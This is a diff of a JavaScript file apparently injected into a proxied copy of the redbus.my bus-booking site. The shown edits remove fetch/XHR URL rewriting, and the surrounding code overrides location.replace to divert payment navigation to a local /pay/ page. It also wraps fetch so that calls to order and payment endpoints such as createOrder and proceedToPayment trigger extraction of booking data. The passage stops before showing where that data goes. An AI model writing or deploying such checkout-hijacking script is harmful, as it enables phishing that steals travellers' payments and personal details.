@@ -1,22 +1,7 @@
 (function(){
   'use strict';
 
-  // Strip redbus.my from fetch/XHR URLs
-  var _fetch = window.fetch;
-  window.fetch = function(input, init) {
-    if (typeof input === 'string') {
-      input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
-    }
-    return _fetch.call(window, input, init);
-  };
-
-  var _origOpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function(method, url) {
-    if (typeof url === 'string') {
-      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
-    }
-    return _origOpen.call(this, method, url);
-  };
+  // API calls go directly to redbus.my (proxy can't forward POST bodies)
 
   // Intercept page navigation to payment → redirect to /pay/
   function checkPayUrl(url) {
@@ -45,11 +30,10 @@
     location.replace = function(u) { return _rep(checkPayUrl(u)); };
   } catch(e) {}
 
-  // Intercept payment API calls
+  // Intercept payment API calls (URLs may be relative or absolute)
   var _origFetch2 = window.fetch;
   window.fetch = function(input, init) {
     if (typeof input === 'string') {
-      input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
       var p = input.split('?')[0];
       if (p.indexOf('/createOrder') !== -1 || p.indexOf('/orderInfo') !== -1 || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1) {
         var bookingData = extractBookingData();
